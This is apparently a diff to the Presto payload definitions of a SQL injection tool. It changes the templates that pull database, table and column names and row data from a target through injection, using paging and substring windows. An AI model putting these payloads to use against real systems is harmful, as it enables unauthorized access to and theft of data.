@@ -3,14 +3,11 @@ vendor: Presto
 resource:
  info: |
   select concat(
-         concat_ws(
-             '${enclose_value_sql}',
-             'version()',
-             'database()',
-             current_user
-         ),
-         '${trail_sql}'
-     )
+      'version()', '${enclose_value_sql}',
+      'database()', '${enclose_value_sql}',
+      current_user,
+      '${trail_sql}'
+  )
 
  schema:
   database: |
@@ -27,10 +24,12 @@ resource:
    )
    || '${trail_sql}' 
    from (
-       select distinct
-           table_schema r,
-           '0' q
-       from information_schema.columns
+       SELECT table_schema r, '0' q FROM (
+           SELECT row_number() over() AS rn, * from (
+               select distinct table_schema 
+               from information_schema.columns
+           )
+       )
        ${limit}
    ) x
 
@@ -47,11 +46,13 @@ resource:
    )
    || '${trail_sql}' 
    from (
-       select distinct
-           table_name r,
-           '0' q
-       from information_schema.columns
-       where table_schema = '${database}'
+       SELECT table_name r, '0' q FROM (
+           SELECT row_number() over() AS rn, * from (
+               select distinct table_name 
+               from information_schema.columns 
+               where table_schema = '${database}'
+           )
+       )
        ${limit}
    ) x   
 
@@ -69,12 +70,14 @@ resource:
    ) 
    || '${trail_sql}' 
    from (
-       select distinct
-           column_name r,
-           '0' q
-       from information_schema.columns
-       where table_schema = '${database}'
-       and table_name = '${table}'
+       SELECT column_name r, '0' q FROM (
+           SELECT row_number() over() AS rn, * from (
+               select distinct column_name 
+               from information_schema.columns
+               where table_schema = '${database}'
+               and table_name = '${table}' 
+           )
+       ) 
        ${limit}
    ) x   
 
@@ -93,12 +96,13 @@ resource:
     ) 
     || '${trail_sql}' 
     from (
-        select
-            cast(schema_name as varchar) r,
-            cast(count(*) as varchar) q
-        from ${database}.${table}
-        group by 1
+        select r, cast(count(*) as varchar) q from (
+            SELECT row_number() over() AS rn, * from (
+                select distinct ${fields} r from ${database}.${table}
+            )
+        )
         ${limit}
+        group by r
     ) x    
    fields:
     field: trim(coalesce(${field.value}, ''))
@@ -108,17 +112,16 @@ strategy:
  configuration:
   slidingWindow: |
    (
-       select
-           concat(
-               '${lead}',
-               substr(
-                   (${injection}),
-                   ${window.char},
-                   ${capacity}
-               )
+       select concat(
+           '${lead}',
+           substr(
+               (${injection}),
+               ${window.char},
+               ${capacity}
            )
+       )
    )
-  limit: offset ${limit.value} limit 65536
+  limit: WHERE rn BETWEEN ${limit.value}%2b1 AND 65536
   failsafe: cast(1337${indice}7330%2b1 as varchar)
   calibrator: array_join(repeat('${calibrator_sql}', 10000),'')
   limitBoundary: 0
